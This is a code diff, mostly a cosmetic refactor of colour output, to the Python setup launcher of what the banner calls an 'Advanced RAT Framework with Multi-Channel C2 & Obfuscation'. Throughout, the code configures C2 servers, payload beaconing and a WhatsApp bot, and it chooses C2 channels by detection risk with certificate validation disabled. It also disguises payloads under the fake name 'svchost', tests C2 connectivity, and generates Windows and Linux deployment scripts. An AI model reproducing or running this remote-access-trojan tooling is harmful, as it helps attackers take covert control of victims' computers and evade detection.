@@ -24,10 +24,6 @@ except ImportError as e:
     sys.exit(1)
 
 
-# ═══════════════════════════════════════════════════════════════════════════
-# TODO: INTEGRATED LAUNCHER INTERFACE
-# ═══════════════════════════════════════════════════════════════════════════
-
 class IntegratedSetupLauncher:
     """Main launcher integrating all setup components"""
     
@@ -47,13 +43,23 @@ class IntegratedSetupLauncher:
         ║  Advanced RAT Framework with Multi-Channel C2 & Obfuscation      ║
         ╚══════════════════════════════════════════════════════════════════╝
         """
-        print(self.style.cyan(banner))
+        print(self.style.color(banner, 'bright_cyan'))
     
     def main_menu(self) -> str:
         """Display main menu"""
         print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
         print(self.style.bold("║       T0OL-B4S3-263 SETUP LAUNCHER       ║"))
         print(self.style.bold("╚════════════════════════════════════════╝"))
+        
+        color_map = {
+            'blue': 'bright_blue',
+            'green': 'bright_green',
+            'yellow': 'bright_yellow',
+            'magenta': 'bright_magenta',
+            'cyan': 'bright_cyan',
+            'red': 'bright_red',
+            'white': 'white'
+        }
         
         options = [
             ("1", "Quick Setup (All Components)", "blue"),
@@ -67,18 +73,16 @@ class IntegratedSetupLauncher:
         ]
         
         for key, label, color in options:
-            colored_label = getattr(self.style, color)(label)
+            colored_label = self.style.color(label, color_map.get(color, 'white'))
             print(f"  {key}. {colored_label}")
         
-        choice = input("\n" + self.style.cyan("Select option: ")).strip()
+        choice = input("\n" + self.style.color("Select option: ", 'bright_cyan')).strip()
         return choice
     
     def setup_basic(self):
         """Run basic configuration"""
-        print("\n" + self.style.yellow("Starting Basic Configuration Setup..."))
-        master = MasterSetup()
+        print("\n" + self.style.color("Starting Basic Configuration Setup...", 'bright_yellow'))
         
-        # Configure C2 Server
         print("\n" + self.style.bold("═" * 50))
         print(self.style.bold("C2 SERVER CONFIGURATION"))
         print(self.style.bold("═" * 50))
@@ -97,7 +101,6 @@ class IntegratedSetupLauncher:
             'port': int(c2_port)
         }
         
-        # Configure Payload
         print("\n" + self.style.bold("═" * 50))
         print(self.style.bold("PAYLOAD CONFIGURATION"))
         print(self.style.bold("═" * 50))
@@ -117,7 +120,6 @@ class IntegratedSetupLauncher:
             'beaconInterval': 30
         }
         
-        # Configure WhatsApp
         print("\n" + self.style.bold("═" * 50))
         print(self.style.bold("WHATSAPP BOT CONFIGURATION"))
         print(self.style.bold("═" * 50))
@@ -133,22 +135,21 @@ class IntegratedSetupLauncher:
             'c2Port': int(c2_port)
         }
         
-        print("\n" + self.style.green("✓ Basic configuration complete!"))
+        print("\n" + self.style.color("✓ Basic configuration complete!", 'bright_green'))
     
     def setup_advanced_c2(self):
         """Setup multi-channel C2"""
-        print("\n" + self.style.yellow("Advanced C2 Configuration"))
+        print("\n" + self.style.color("Advanced C2 Configuration", 'bright_yellow'))
         
         mc2 = MultiChannelC2Config()
         
         print("\nAvailable channels:")
         for ch_name, ch_info in mc2.AVAILABLE_CHANNELS.items():
-            status = self.style.green("●") if ch_name == 'https_direct' else self.style.red("●")
+            status = self.style.color("●", 'bright_green') if ch_name == 'https_direct' else self.style.color("●", 'bright_red')
             print(f"  {status} {ch_name}: {ch_info['name']}")
             print(f"     {ch_info['description']}")
             print(f"     Risk: {ch_info['detection_risk']}, Speed: {ch_info['speed']}\n")
         
-        # Select primary
         primary = self.prompt.prompt_choice(
             "Primary channel",
             list(mc2.AVAILABLE_CHANNELS.keys()),
@@ -156,7 +157,6 @@ class IntegratedSetupLauncher:
         )
         mc2.config['primary'] = primary
         
-        # Configure channels
         print("\nConfigure HTTPS Direct channel:")
         https_host = self.prompt.prompt_text("HTTPS Host", default="c2.example.com")
         https_port = self.prompt.prompt_text("HTTPS Port", default="443")
@@ -168,12 +168,12 @@ class IntegratedSetupLauncher:
             'certificate_validation': False
         })
         
-        print("\n" + self.style.green("✓ Multi-channel C2 configured!"))
+        print("\n" + self.style.color("✓ Multi-channel C2 configured!", 'bright_green'))
         self.config['c2_advanced'] = mc2.get_config()
     
     def setup_obfuscation(self):
         """Setup payload obfuscation"""
-        print("\n" + self.style.yellow("Payload Obfuscation Configuration"))
+        print("\n" + self.style.color("Payload Obfuscation Configuration", 'bright_yellow'))
         
         obf = ObfuscationConfig()
         
@@ -192,8 +192,7 @@ class IntegratedSetupLauncher:
         
         obf.set_level(levels[choice])
         
-        # Payload customization
-        print("\n" + self.style.bold("Payload Appearance:"))
+        print("\n" + self.style.color("Payload Appearance:", 'bold'))
         fake_name = self.prompt.prompt_text(
             "Fake executable name (no extension)",
             default="svchost"
@@ -202,13 +201,13 @@ class IntegratedSetupLauncher:
         custom = PayloadCustomization()
         custom.config['name'] = fake_name
         
-        print("\n" + self.style.green("✓ Obfuscation configured!"))
+        print("\n" + self.style.color("✓ Obfuscation configured!", 'bright_green'))
         self.config['obfuscation'] = obf.config
         self.config['payload_custom'] = custom.get_config()
     
     def init_database(self):
         """Initialize SQLite database"""
-        print("\n" + self.style.yellow("Initializing Session Database..."))
+        print("\n" + self.style.color("Initializing Session Database...", 'bright_yellow'))
         
         db_path = self.prompt.prompt_text(
             "Database path",
@@ -217,20 +216,19 @@ class IntegratedSetupLauncher:
         
         try:
             self.db = SessionDatabase(db_path)
-            print(self.style.green(f"✓ Database initialized at {db_path}"))
+            print(self.style.color(f"✓ Database initialized at {db_path}", 'bright_green'))
             self.config['database'] = {'path': db_path}
         except Exception as e:
-            print(self.style.red(f"✗ Database initialization failed: {e}"))
+            print(self.style.color(f"✗ Database initialization failed: {e}", 'bright_red'))
     
     def deploy_and_test(self):
         """Deploy and test configuration"""
-        print("\n" + self.style.yellow("Deployment & Testing"))
+        print("\n" + self.style.color("Deployment & Testing", 'bright_yellow'))
         
         if not self.config:
-            print(self.style.red("No configuration loaded! Run Basic Setup first."))
+            print(self.style.color("No configuration loaded! Run Basic Setup first.", 'bright_red'))
             return
         
-        # Test C2 connectivity
         if 'c2' in self.config:
             print(f"\nTesting C2 connectivity to {self.config['c2']['host']}:{self.config['c2']['port']}...")
             
@@ -241,13 +239,12 @@ class IntegratedSetupLauncher:
             
             results = tester.run_all_tests()
             
-            dns_ok = self.style.green("✓") if results.get('dns_resolution') else self.style.red("✗")
-            c2_ok = self.style.green("✓") if results.get('c2_connectivity') else self.style.red("✗")
+            dns_ok = self.style.color("✓", 'bright_green') if results.get('dns_resolution') else self.style.color("✗", 'bright_red')
+            c2_ok = self.style.color("✓", 'bright_green') if results.get('c2_connectivity') else self.style.color("✗", 'bright_red')
             
             print(f"  DNS Resolution: {dns_ok}")
             print(f"  C2 Connectivity: {c2_ok}")
         
-        # Generate deployment scripts
         if self.config:
             print("\nGenerating deployment scripts...")
             deployer = DeploymentHelper(Path.cwd())
@@ -257,42 +254,42 @@ class IntegratedSetupLauncher:
             
             with open('deploy_windows.ps1', 'w') as f:
                 f.write(ps_script)
-            print(self.style.green("✓ Generated deploy_windows.ps1"))
+            print(self.style.color("✓ Generated deploy_windows.ps1", 'bright_green'))
             
             with open('deploy_linux.sh', 'w') as f:
                 f.write(bash_script)
-            print(self.style.green("✓ Generated deploy_linux.sh"))
+            print(self.style.color("✓ Generated deploy_linux.sh", 'bright_green'))
     
     def show_summary(self):
         """Display configuration summary"""
         if not self.config:
-            print(self.style.red("No configuration loaded!"))
+            print(self.style.color("No configuration loaded!", 'bright_red'))
             return
         
         print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
         print(self.style.bold("║   CONFIGURATION SUMMARY                  ║"))
         print(self.style.bold("╚════════════════════════════════════════╝"))
         
-        print(self.style.cyan("\n[C2 Server]"))
+        print(self.style.color("\n[C2 Server]", 'bright_cyan'))
         if 'c2' in self.config:
-            print(f"  Host: {self.style.green(self.config['c2']['host'])}")
-            print(f"  Port: {self.style.green(str(self.config['c2']['port']))}")
+            print(f"  Host: {self.style.color(self.config['c2']['host'], 'bright_green')}")
+            print(f"  Port: {self.style.color(str(self.config['c2']['port']), 'bright_green')}")
         
-        print(self.style.cyan("\n[Payload]"))
+        print(self.style.color("\n[Payload]", 'bright_cyan'))
         if 'payload' in self.config:
-            print(f"  Target: {self.style.green(self.config['payload']['c2Host'])}")
-            print(f"  Port: {self.style.green(str(self.config['payload']['c2Port']))}")
-            print(f"  Beacon Interval: {self.style.green('30s')}")
+            print(f"  Target: {self.style.color(self.config['payload']['c2Host'], 'bright_green')}")
+            print(f"  Port: {self.style.color(str(self.config['payload']['c2Port']), 'bright_green')}")
+            print(f"  Beacon Interval: {self.style.color('30s', 'bright_green')}")
         
-        print(self.style.cyan("\n[Obfuscation]"))
+        print(self.style.color("\n[Obfuscation]", 'bright_cyan'))
         if 'obfuscation' in self.config:
-            print(f"  Level: {self.style.green(self.config['obfuscation']['level'].upper())}")
+            print(f"  Level: {self.style.color(self.config['obfuscation']['level'].upper(), 'bright_green')}")
             enabled = len(self.config['obfuscation']['enabled_techniques'])
-            print(f"  Techniques: {self.style.green(str(enabled))}")
+            print(f"  Techniques: {self.style.color(str(enabled), 'bright_green')}")
         
-        print(self.style.cyan("\n[Database]"))
+        print(self.style.color("\n[Database]", 'bright_cyan'))
         if 'database' in self.config:
-            print(f"  Path: {self.style.green(self.config['database']['path'])}")
+            print(f"  Path: {self.style.color(self.config['database']['path'], 'bright_green')}")
         
         print("\n" + self.style.bold("═" * 42))
     
@@ -321,10 +318,10 @@ class IntegratedSetupLauncher:
             elif choice == "7":
                 self.show_summary()
             elif choice == "8":
-                print(self.style.cyan("Exiting T0OL-B4S3-263 Setup Launcher..."))
+                print(self.style.color("Exiting T0OL-B4S3-263 Setup Launcher...", 'bright_cyan'))
                 sys.exit(0)
             else:
-                print(self.style.red("Invalid option!"))
+                print(self.style.color("Invalid option!", 'bright_red'))
 
 
 if __name__ == '__main__':
